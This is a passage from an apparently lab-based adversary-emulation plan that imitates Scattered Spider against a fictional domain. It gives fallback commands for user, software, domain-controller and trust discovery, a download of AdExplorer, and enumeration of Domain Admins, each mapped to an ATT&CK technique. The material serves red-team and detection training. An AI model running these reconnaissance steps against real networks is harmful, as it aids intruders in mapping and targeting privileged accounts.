+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial Access</td>
+<td>T1078</td>
+<td>Valid Accounts</td>
+<td>Linux, Identity Provider</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider authenticates to victim SSO dashboard as <code v-pre>tlannister</code></td>
+<td>citywatch (10.55.3.102)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/" class="outbound" target="_blank"><span>8</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.trellix.com/blogs/research/scattered-spider-the-modus-operandi/" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-1---guacamole-connection-to-remote-desktop-session-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---guacamole-connection-to-remote-desktop-session-fails">#</doc-anchor-trigger>
+        <span>Step 1 - Guacamole Connection to Remote Desktop Session Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-4">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-4">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps in the event that Guacamole fails to
+connect to the remote desktop session.</p>
+<doc-anchor-target id="step-1---adding-secondary-mfa-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---adding-secondary-mfa-fails">#</doc-anchor-trigger>
+        <span>Step 1 - Adding Secondary MFA Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-5">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-5">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>There are currently no alternative steps in the event that the operator fails to
+add a secondary MFA method to the <code v-pre>tlannister</code> user within the SSO portal.</p>
+<doc-anchor-target id="step-2---discovery-commands-fail">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---discovery-commands-fail">#</doc-anchor-trigger>
+        <span>Step 2 - Discovery Commands Fail</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-6">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-6">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If any of the discovery commands fail to execute, perform the corresponding
+alternative steps for the failed command.</p>
+<doc-anchor-target id="procedures-3">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-3">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> If <code v-pre>whoami</code> failed to execute, run the following command in Command Prompt:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">echo %USERDOMAIN%\%USERNAME%</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">discovery output</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> If <code v-pre>ping google.com</code> failed to execute, open FireFox and browse to
+<code v-pre>google.com</code>. Close the browser tab after successful connection.</p>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> If <code v-pre>wmic product get name, version</code> failed to execute, open an administrator
+PowerShell prompt and run the following command:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Get-CimInstance Win32_Product | Sort-Object -property Name | Format-Table -Property Name, Version</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">discovery output</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> If <code v-pre>nltest /dclist:kingslanding.net</code> failed to execute, return to the
+administrator Command Prompt and run the following command:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">net group &quot;Domain Controllers&quot; /domain</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">discovery output</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> If <code v-pre>nltest /domain_trusts</code> failed to execute, return to the administrator
+Command Prompt and run the following command:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">netdom query /d:kingslanding.net trust</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Direction Trusted\Trusting domain                         Trust type
+========= =======================                         ==========
+
+The command completed successfully.</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-3">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-3">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Discovery</td>
+<td>T1033</td>
+<td>System Owner User Discovery</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider executes <code v-pre>echo %USERDOMAIN%\%USERNAME%</code></td>
+<td>dragongate (10.55.3.104)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/sim-swapping-abuse-azure-serial" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1016.001</td>
+<td>System Network Configuration Discovery: Internet Connection Discovery</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider visits google.com</td>
+<td>dragongate (10.55.3.104)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/sim-swapping-abuse-azure-serial" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1518</td>
+<td>Software Discovery</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider executes <code v-pre>Get-CimInstance Win32_Product</code> to find installed software</td>
+<td>dragongate (10.55.3.104)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://github.com/blackorbird/APT_REPORT/blob/master/summary/2024/crowdstrike-2024-threat-hunting-report.pdf" class="outbound" target="_blank"><span>2</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1018</td>
+<td>Remote System Discovery</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider executes <code v-pre>net group &quot;Domain Controllers&quot; /domain</code></td>
+<td>dragongate (10.55.3.104)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a" class="outbound" target="_blank"><span>1</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://github.com/blackorbird/APT_REPORT/blob/master/summary/2024/crowdstrike-2024-threat-hunting-report.pdf" class="outbound" target="_blank"><span>2</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/sim-swapping-abuse-azure-serial" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1482</td>
+<td>Domain Trust Discovery</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider executes <code v-pre>netdom query /d:kingslanding.net trust</code></td>
+<td>dragongate (10.55.3.104)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a" class="outbound" target="_blank"><span>1</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://github.com/blackorbird/APT_REPORT/blob/master/summary/2024/crowdstrike-2024-threat-hunting-report.pdf" class="outbound" target="_blank"><span>2</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/sim-swapping-abuse-azure-serial" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-2---pinging-domain-controller-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---pinging-domain-controller-fails">#</doc-anchor-trigger>
+        <span>Step 2 - Pinging Domain Controller Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-7">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-7">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If the <code v-pre>ping redkeep.kingslanding.net</code> command fails, perform the following
+alternative steps to ping the domain controller.</p>
+<doc-anchor-target id="procedures-4">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-4">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Open an administrator PowerShell prompt if one does not already exist, and
+execute the following command</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Test-Connection -ComputerName redkeep.kingslanding.net</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-4">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-4">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Discovery</td>
+<td>T1018</td>
+<td>Remote System Discovery</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider pings <code v-pre>redkeep.kingslanding.net</code></td>
+<td>dragongate (10.55.3.104)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a" class="outbound" target="_blank"><span>1</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://github.com/blackorbird/APT_REPORT/blob/master/summary/2024/crowdstrike-2024-threat-hunting-report.pdf" class="outbound" target="_blank"><span>2</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://cloud.google.com/blog/topics/threat-intelligence/sim-swapping-abuse-azure-serial" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-2---downloading-adexplorer-fails">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---downloading-adexplorer-fails">#</doc-anchor-trigger>
+        <span>Step 2 - Downloading AdExplorer Fails</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-8">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-8">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If AdExplorer fails to download, perform the following alternative steps.</p>
+<doc-anchor-target id="procedures-5">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-5">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Return to your command prompt and run the following command to download
+AdExplorer via <code v-pre>curl</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-batch"><code v-pre class="language-batch">curl https://download.sysinternals.com/files/AdExplorer.zip --output C:\Users\tlannister\Downloads\AdExplorer.zip</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+<doc-anchor-target id="reference-tables-5">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reference-tables-5">#</doc-anchor-trigger>
+        <span>Reference Tables</span>
+    </h3>
+</doc-anchor-target>
+<div class="table-wrapper scrollbar overflow-hidden">
+<table class="comfortable">
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Platform</th>
+<th>Detection Criteria</th>
+<th>Category</th>
+<th>Red Team Activity</th>
+<th>Hosts</th>
+<th>Users</th>
+<th>Source Code Links</th>
+<th>Relevant CTI Reports</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Command and Control</td>
+<td>T1105</td>
+<td>Ingress Tool Transfer</td>
+<td>Windows</td>
+<td>-</td>
+<td>Calibrated - Not Benign</td>
+<td>Scattered Spider downloads AdExplorer</td>
+<td>dragongate (10.55.3.104)</td>
+<td>tlannister</td>
+<td>-</td>
+<td><a href="https://cloud.google.com/blog/topics/threat-intelligence/unc3944-sms-phishing-sim-swapping-ransomware/" class="outbound" target="_blank"><span>5</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://www.reliaquest.com/blog/scattered-spider-attack-analysis-account-compromise/" class="outbound" target="_blank"><span>8</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+<doc-anchor-target id="step-2---adexplorer-fails-to-execute">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---adexplorer-fails-to-execute">#</doc-anchor-trigger>
+        <span>Step 2 - AdExplorer Fails to Execute</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="voice-track-9">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#voice-track-9">#</doc-anchor-trigger>
+        <span>Voice Track</span>
+    </h3>
+</doc-anchor-target>
+<p>If AdExplorer fails to execute, perform the following alternative steps.</p>
+<doc-anchor-target id="procedures-6">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures-6">#</doc-anchor-trigger>
+        <span>Procedures</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> Open an administrator PowerShell prompt if one does not already exist, and
+execute the following command to install the <code v-pre>ActiveDirectory</code> PowerShell module</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Add-WindowsCapability –online –Name &quot;Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0&quot;;Install-WindowsFeature -Name &quot;RSAT-AD-PowerShell&quot; -IncludeAllSubFeature;Import-Module -Name ActiveDirectory</code></pre>
+</doc-codeblock></div>
+<ul>
+<li><p><em><strong>Expected Output</strong></em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Path          :
+Online        : True
+RestartNeeded : False
+
+
+Success       : True
+RestartNeeded : No
+FeatureResult : {}
+ExitCode      : NoChangeNeeded</code></pre>
+</doc-codeblock></div>
+</li>
+</ul>
+</li>
+<li><p><span class="docs-emoji">&#x2623;&#xFE0F;</span> In same PowerShell prompt, execute the following commands to enumerate
+members of the <code v-pre>Domain Admins</code> and <code v-pre>System Admins</code> groups</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<div class="codeblock-title">psh</div>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Get-ADGroupMember &quot;Domain Admins&quot;;Get-ADGroupMember &quot;System Admins&quot;</code></pre>
+</doc-codeblock></div>
+<ul>
